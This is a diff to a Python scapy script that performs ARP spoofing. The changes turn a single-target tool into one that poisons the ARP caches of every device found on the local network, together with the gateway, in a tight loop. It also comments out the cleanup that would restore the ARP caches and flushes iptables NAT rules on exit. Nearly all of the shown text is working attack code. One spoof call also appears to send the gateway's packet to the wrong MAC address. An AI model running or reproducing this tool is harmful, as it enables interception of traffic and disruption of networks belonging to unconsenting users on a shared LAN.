@@ -28,8 +28,8 @@ def get_mac(ip):
 
     # return 'b4:6b:fc:1d:e8:9f' # error here, use this for temp
 
-def spoof(target_ip, spoof_ip):
-    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip), psrc = spoof_ip)
+def spoof(target_ip, spoof_ip, target_mac):
+    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
   
     scapy.send(packet, verbose = False)
 
@@ -70,7 +70,7 @@ def get_local_info():
     
     return address, netmask, broadcast, str(slash), gw
 
-def getDevice(ip):
+def getDevice(ip, gw):
     request = scapy.ARP()
     request.pdst = ip
     broadcast = scapy.Ether()
@@ -80,13 +80,20 @@ def getDevice(ip):
     request_broadcast = broadcast / request
     clients = scapy.srp(request_broadcast, timeout=10, verbose=1)[0]
 
+    result = []
+
     print('Available devices')
     print('----------------------------')
     print('IP         MAC')
     print('----------------------------')
     for element in clients:
-        print(element[1].psrc + "   " + element[1].hwsrc)
+        if element[1].psrc != gw:
+            print(element[1].psrc + "   " + element[1].hwsrc)
+            result_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
+            result.append(result_dict)
     print(' ')
+
+    return result
 
 def get_information(filename, record):
     # parse log
@@ -178,9 +185,9 @@ if __name__ == '__main__':
     address, netmask, broadcast, slash, gw = get_local_info()
 
     # print(get_mac('192.168.99.100')) 
-    getDevice(address + '/' + slash)
+    result = getDevice(address + '/' + slash, gw)
 
-    target_ip = "172.20.10.11" # Enter your target IP
+    # target_ip = "172.20.10.11" # Enter your target IP
     # gateway_ip = "192.168.99.1" # Enter your gateway's IP
     gateway_ip = gw
 
@@ -192,19 +199,24 @@ if __name__ == '__main__':
     try:
         sent_packets_count = 0
         while True:
-            spoof(target_ip, gateway_ip) # cheat on victim to know I am gateway
-            spoof(gateway_ip, target_ip) # cheat on switch to know I am target
-            sent_packets_count = sent_packets_count + 2
-            print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
-            time.sleep(2) # Waits for two seconds
+            for index in result:
+                if index['ip'] != gw:
+                    target_ip = index['ip']
+                    target_mac = index['mac']
+                    spoof(target_ip, gateway_ip, target_mac) # cheat on victim to know I am gateway
+                    spoof(gateway_ip, target_ip, target_mac) # cheat on switch to know I am target
+                    sent_packets_count = sent_packets_count + 2
+                    print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
+                    # time.sleep(0.5) # Waits for two seconds
     
     except KeyboardInterrupt:
         print("\nCtrl + C pressed.............Exiting")
-        restore(gateway_ip, target_ip)
-        restore(target_ip, gateway_ip)
+        # restore(gateway_ip, target_ip)
+        # restore(target_ip, gateway_ip)
         print("[-] Arp Spoof Stopped")
         stop_threads = True
         t.join()
+        os.system("iptables -t nat -F")
         print("stop thread")
 
     # interface = netifaces.interfaces()[1]
